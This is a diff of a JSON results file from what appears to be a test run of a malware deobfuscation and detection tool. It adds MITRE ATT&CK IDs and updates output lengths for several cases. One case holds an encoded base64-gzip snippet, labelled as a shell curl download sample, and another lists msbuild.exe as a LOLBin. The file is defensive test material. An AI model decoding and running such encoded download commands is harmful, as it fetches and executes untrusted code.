@@ -1,7 +1,7 @@
 {
   "date": "2026-07-18",
   "total": 52,
-  "elapsed_sec": 9.24,
+  "elapsed_sec": 13.26,
   "results": [
     {
       "n": 1,
@@ -105,12 +105,14 @@
       "chain": [
         "extract-payload"
       ],
-      "mitre_count": 0,
-      "mitre_ids": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1562.001"
+      ],
       "lolbins": [],
       "iocs_urls": [],
       "iocs_ips": [],
-      "output_len": 480
+      "output_len": 531
     },
     {
       "n": 5,
@@ -174,7 +176,7 @@
     {
       "n": 7,
       "label": "B2 \u00b7 b64 \u2192 gzip \u2192 shell curl",
-      "input_snippet": "echo 'H4sIAN9wW2oC/0suLcpR0E0rDvZRyCgpKbDS16/Qy8wHEsUZCjUKSYnFGQDBGOWIIgAAAA==' ",
+      "input_snippet": "echo 'H4sIALl1W2oC/0suLcpR0E0rDvZRyCgpKbDS16/Qy8wHEsUZCjUKSYnFGQDBGOWIIgAAAA==' ",
       "status": 200,
       "engine": "archetype:Bash_base64_gunzip_pipe+BASH_WGET_FLOCK_BACKGROUND",
       "score": 100,
@@ -351,12 +353,14 @@
         "extract-int-array",
         "chr-decode"
       ],
-      "mitre_count": 0,
-      "mitre_ids": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1027"
+      ],
       "lolbins": [],
       "iocs_urls": [],
       "iocs_ips": [],
-      "output_len": 426
+      "output_len": 477
     },
     {
       "n": 14,
@@ -599,12 +603,14 @@
       "chain": [
         "xor"
       ],
-      "mitre_count": 0,
-      "mitre_ids": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1059.004"
+      ],
       "lolbins": [],
       "iocs_urls": [],
       "iocs_ips": [],
-      "output_len": 388
+      "output_len": 433
     },
     {
       "n": 25,
@@ -866,14 +872,16 @@
       "level": "undecoded",
       "reached_shellcode": false,
       "chain": [],
-      "mitre_count": 0,
-      "mitre_ids": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1127.001"
+      ],
       "lolbins": [
         "msbuild.exe"
       ],
       "iocs_urls": [],
       "iocs_ips": [],
-      "output_len": 394
+      "output_len": 445
     },
     {
       "n": 36,
@@ -1116,14 +1124,16 @@
       "chain": [
         "jwt-decode"
       ],
-      "mitre_count": 0,
-      "mitre_ids": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1552.004"
+      ],
       "lolbins": [],
       "iocs_urls": [
         "https://www.googleapis.com/auth/cloud-platform"
       ],
       "iocs_ips": [],
-      "output_len": 785
+      "output_len": 838
     },
     {
       "n": 46,
